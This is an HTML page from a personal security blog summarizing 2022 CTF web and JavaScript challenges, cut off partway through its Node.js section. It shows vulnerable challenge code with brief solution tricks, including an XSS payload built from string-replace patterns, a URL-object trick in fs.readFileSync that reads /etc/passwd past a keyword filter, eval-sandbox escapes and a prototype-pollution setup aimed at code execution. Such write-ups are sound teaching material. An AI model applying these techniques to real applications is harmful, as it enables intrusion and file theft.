<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>Summary of CTF Web Frontend and JS Challenges in 2022 - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<link href="https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/" rel="alternate" hreflang="en" />


<link href="https://blog.huli.tw/2022/12/26/ctf-2022-web-js-summary/" rel="alternate" hreflang="x-default" />


<link href="https://blog.huli.tw/2022/12/26/ctf-2022-web-js-summary/" rel="alternate" hreflang="zh-TW" />
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/">
    





    <meta name="description" content="This year, I seriously followed Water Paddler to play CTF for a whole year. I saw someone wrote a CTF: Best Web Challenges 2022 and found that I had played most of the challenges inside. So I thought">
<meta property="og:type" content="article">
<meta property="og:title" content="Summary of CTF Web Frontend and JS Challenges in 2022">
<meta property="og:url" content="https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="This year, I seriously followed Water Paddler to play CTF for a whole year. I saw someone wrote a CTF: Best Web Challenges 2022 and found that I had played most of the challenges inside. So I thought">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/ctf-2022-web-js-summary/cover-en.png">
<meta property="article:published_time" content="2022-12-26T11:10:44.000Z">
<meta property="article:modified_time" content="2025-02-28T12:55:15.497Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/ctf-2022-web-js-summary/cover-en.png">



<link rel="alternative" href="/atom.xml" title="Summary of CTF Web Frontend and JS Challenges in 2022" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#js-related-knowledge">1&nbsp;&nbsp;<b>JS-related knowledge</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-no-cookies">1.1&nbsp;&nbsp;DiceCTF 2022 - no-cookies</a>
                    
                    
                    
                    <a class="navbar-item" href="#plaidctf-2022-yaca">1.2&nbsp;&nbsp;PlaidCTF 2022 - YACA</a>
                    
                    
                    
                    <a class="navbar-item" href="#ångstromctf-2022-caasio-pse">1.3&nbsp;&nbsp;ångstromCTF 2022 - CaaSio PSE</a>
                    
                    
                    
                    <a class="navbar-item" href="#googlectf-2022-horkos">1.4&nbsp;&nbsp;GoogleCTF 2022 - HORKOS</a>
                    
                    
                    
                    <a class="navbar-item" href="#corctf-2022-sbxcalc">1.5&nbsp;&nbsp;corCTF 2022 - sbxcalc</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#nodejs-related">2&nbsp;&nbsp;<b>Node.js related</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-undefined">2.1&nbsp;&nbsp;DiceCTF 2022 - undefined</a>
                    
                    
                    
                    <a class="navbar-item" href="#corctf-2022-simplewaf">2.2&nbsp;&nbsp;corCTF 2022 - simplewaf</a>
                    
                    
                    
                    <a class="navbar-item" href="#balsn-ctf-2022-2linenodejs">2.3&nbsp;&nbsp;Balsn CTF 2022 - 2linenodejs</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#xsleaks">3&nbsp;&nbsp;<b>XSleaks</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-carrot">3.1&nbsp;&nbsp;DiceCTF 2022 - carrot</a>
                    
                    
                    
                    <a class="navbar-item" href="#tsj-ctf-2022-nim-notes">3.2&nbsp;&nbsp;TSJ CTF 2022 - Nim Notes</a>
                    
                    
                    
                    <a class="navbar-item" href="#ångstromctf-2022-sustenance">3.3&nbsp;&nbsp;ångstromCTF 2022 - Sustenance</a>
                    
                    
                    
                    <a class="navbar-item" href="#justctf-2022-ninja">3.4&nbsp;&nbsp;justCTF 2022 - Ninja</a>
                    
                    
                    
                    <a class="navbar-item" href="#sekaictf-2022-safelist">3.5&nbsp;&nbsp;SekaiCTF 2022 - safelist</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#front-end-domx2fbom-related-knowledge">4&nbsp;&nbsp;<b>Front-end DOM/BOM related knowledge</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#dicectf-2022-shadow">4.1&nbsp;&nbsp;DiceCTF 2022 - shadow</a>
                    
                    
                    
                    <a class="navbar-item" href="#line-ctf-2022-haribote-secure-note">4.2&nbsp;&nbsp;LINE CTF 2022 - Haribote Secure Note</a>
                    
                    
                    
                    <a class="navbar-item" href="#m0lecon-ctf-2022-ptmd">4.3&nbsp;&nbsp;m0leCon CTF 2022 - ptMD</a>
                    
                    
                    
                    <a class="navbar-item" href="#corctf-2022-modernblog">4.4&nbsp;&nbsp;corCTF 2022 - modernblog</a>
                    
                    
                    
                    <a class="navbar-item" href="#hitcon-ctf-2022-self-destruct-message">4.5&nbsp;&nbsp;HITCON CTF 2022 - Self Destruct Message</a>
                    
                    
                    
                    <a class="navbar-item" href="#sekaictf-2022-obligatory-calc">4.6&nbsp;&nbsp;SekaiCTF 2022 - Obligatory Calc</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#browser-internals-related">5&nbsp;&nbsp;<b>Browser internals related</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#googlectf-2022-postviewer">5.1&nbsp;&nbsp;GoogleCTF 2022 - POSTVIEWER</a>
                    
                    
                    
                    <a class="navbar-item" href="#uiuctf-2022-modernism">5.2&nbsp;&nbsp;UIUCTF 2022 - modernism</a>
                    
                    
                    
                    <a class="navbar-item" href="#uiuctf-2022-precisionism">5.3&nbsp;&nbsp;UIUCTF 2022 - precisionism</a>
                    
                    
                    
                    <a class="navbar-item" href="#seccon-ctf-2022-quals-spanote">5.4&nbsp;&nbsp;SECCON CTF 2022 Quals - spanote</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#bonus-authors-of-great-web-challenges">6&nbsp;&nbsp;<b>Bonus: Authors of Great Web Challenges</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#summary">7&nbsp;&nbsp;<b>Summary</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/12/26/ctf-2022-web-js-summary/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Summary of CTF Web Frontend and JS Challenges in 2022
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-12-26T11:10:44.000Z" itemprop="datePublished">26 December 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>This year, I seriously followed Water Paddler to play CTF for a whole year. I saw someone wrote a <a target="_blank" rel="noopener" href="https://blog.arkark.dev/2022/12/17/best-web-challs/">CTF: Best Web Challenges 2022</a> and found that I had played most of the challenges inside. So I thought it would be better for me to write a summary, documenting the challenges that I personally felt I had learned something new from.</p>
<p>Because of my personal interest, the challenges that I played were related to frontend and JS. Challenges related to backend (PHP, Java, etc.) are not included.</p>
<p>Also, the techniques or solutions recorded in this article do not represent the first appearance in CTF. They are just the first time I saw them or thought they were worth recording, so I wrote them down.</p>
<p>I divided the challenges into several categories:</p>
<ol>
<li>JS-related knowledge</li>
<li>Node.js related</li>
<li>XSLeaks</li>
<li>Frontend DOM&#x2F;BOM related knowledge</li>
<li>Browser internal operation related</li>
</ol>
<span id="more"></span>

<h2><span id="js-related-knowledge">JS-related knowledge</span></h2><h3><span id="dicectf-2022-no-cookies">DiceCTF 2022 - no-cookies</span></h3><p>The key point of this challenge is a piece of code that looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> pwd <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">'input password'</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[^$']+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>pwd<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>
  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> xssPayload
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The last line has a DOM-based XSS, but the pwd you want to steal is inside the block, and it seems impossible to access this part.</p>
<p>The key is the seemingly inconspicuous RegExp, which has a magical property called <code>RegExp.input</code>, which will remember the last thing tested. Therefore, you can use this to get the pwd.</p>
<p>Detailed writeup: <a href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fno-cookies5-solves">https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fno-cookies5-solves</a></p>
<h3><span id="plaidctf-2022-yaca">PlaidCTF 2022 - YACA</span></h3><p>The core concept of the challenge is similar to this (but I remember it was an unintended solution):</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> tmpl <span class="token operator">=</span> <span class="token string">'&lt;input type="submit" value="&#123;&#123;value&#125;&#125;">'</span>
<span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">'your payload'</span><span class="token punctuation">)</span>
value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[>"]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
tmpl <span class="token operator">=</span> tmpl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123;value&#125;&#125;'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> tmpl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>&gt;&quot;</code> is all replaced, and it seems impossible to escape the attribute. But the key is that the parameter of tmpl replace can be controlled. At this time, you can use <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement">special replacement pattern</a> to get the tag:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> tmpl <span class="token operator">=</span> <span class="token string">'&lt;input type="submit" value="&#123;&#123;value&#125;&#125;">'</span>
<span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token string">"$'&lt;style onload=alert(1) "</span>
value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[>"]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
tmpl <span class="token operator">=</span> tmpl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123;value&#125;&#125;'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">)</span>
<span class="token comment">// &lt;input type="submit" value="">&lt;style onload=alert(1) "></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Full writeup: <a href="https://blog.huli.tw/2022/04/14/en/javascript-string-regexp-magic/">https://blog.huli.tw/2022/04/14/en/javascript-string-regexp-magic/</a></p>
<h3><span id="ångstromctf-2022-caasio-pse">ångstromCTF 2022 - CaaSio PSE</span></h3><p>In short, use <code>with()</code> to bypass the restriction that <code>.</code> cannot be used.</p>
<p>Complete writeup: <a href="https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#miscx2fcaasio-pse">https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#miscx2fcaasio-pse</a></p>
<h3><span id="googlectf-2022-horkos">GoogleCTF 2022 - HORKOS</span></h3><p>I call this challenge “JS deserialization”. In short, there are also some magic methods in JS that will be executed automatically.</p>
<p>For example, when you return something in an async function, if this thing is a Promise, it will be resolved before returning, so <code>then</code> will be called automatically.</p>
<p>Similarly, some implicit type conversions will also call <code>toString</code> or <code>valueOf</code>, and <code>toJSON</code> will be called when converted to JSON.</p>
<p>Complete writeup: <a href="https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/">https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/</a></p>
<h3><span id="corctf-2022-sbxcalc">corCTF 2022 - sbxcalc</span></h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">flag</span><span class="token operator">:</span> window<span class="token punctuation">.</span>flag <span class="token operator">||</span> <span class="token string">'flag'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token string">'nope'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>How to get the original object protected by Proxy?</p>
<p>The answer is <code>Object.getOwnPropertyDescriptor(p, &#39;flag&#39;)</code></p>
<p>Writeup: <a href="https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#corctf-2022-sbxcalc">https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#corctf-2022-sbxcalc</a></p>
<h2><span id="nodejs-related">Node.js related</span></h2><h3><span id="dicectf-2022-undefined">DiceCTF 2022 - undefined</span></h3><p>The core of this problem is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token keyword">delete</span> global<span class="token punctuation">.</span>global<span class="token punctuation">;</span>
process <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> __dirname<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Int8Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
  <span class="token comment">// ... a lot of similar statements to make things undefined</span>
  
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Basically, everything is turned into <code>undefined</code> first, and then the code you pass in will be executed using <code>eval</code>. Although you can run anything, because everything has become <code>undefined</code>, there is not much you can do.</p>
<p>There are three solutions:</p>
<ol>
<li><code>import()</code>, which has not been deleted.</li>
<li>Using <code>arguments.callee.caller.arguments</code> can get the overwritten arguments of the upper layer (a layer automatically wrapped by Node.js).</li>
<li>Using try-catch can get the instance of Error.</li>
</ol>
<p>Detailed writeup: <a href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves">https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves</a></p>
<h3><span id="corctf-2022-simplewaf">corCTF 2022 - simplewaf</span></h3><p>The core of this problem is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">[</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> item <span class="token operator">&amp;&amp;</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"bad hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file <span class="token operator">||</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>You can control <code>req.query.file</code>, but it cannot contain the word <code>flag</code>. The goal is to read the file <code>/app/flag.txt</code>.</p>
<p>You need to look at the internal implementation of <code>fs.readFileSync</code> and find that you can pass an object that looks like a URL instance, and it will use <code>new URL()</code> to read it, so you can bypass it with URL encoding:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">href</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token literal-property property">origin</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token literal-property property">protocol</span><span class="token operator">:</span> <span class="token string">'file:'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">hostname</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
  <span class="token literal-property property">pathname</span><span class="token operator">:</span> <span class="token string">'/etc/passw%64'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">// equals to readFileSync(new URL("file:///etc/passw%64"))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Author’s writeup: <a target="_blank" rel="noopener" href="https://brycec.me/posts/corctf_2022_challenges#simplewaf">https://brycec.me/posts/corctf_2022_challenges#simplewaf</a></p>
<h3><span id="balsn-ctf-2022-2linenodejs">Balsn CTF 2022 - 2linenodejs</span></h3><p>The core of the code looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token hashbang comment">#!/usr/local/bin/node</span>
process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'readable'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> json <span class="token operator">=</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\?(.*?)\ </span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">?.</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">JSON: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>json<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, Object:</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./index'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage'</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">finally</span><span class="token punctuation">&#123;</span>
    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// index</span>
module<span class="token punctuation">.</span><span class="token function-variable function">exports</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token parameter"><span class="token constant">O</span><span class="token punctuation">,</span>o</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>
    Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token constant">O</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>
        <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">,</span><span class="token constant">V</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">=></span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token constant">V</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span>k<span class="token punctuation">,</span>v<span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token operator">=</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token operator">||</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>o<span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">,</span> o
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>There is an obvious prototype pollution, and RCE needs to be achieved.</p>
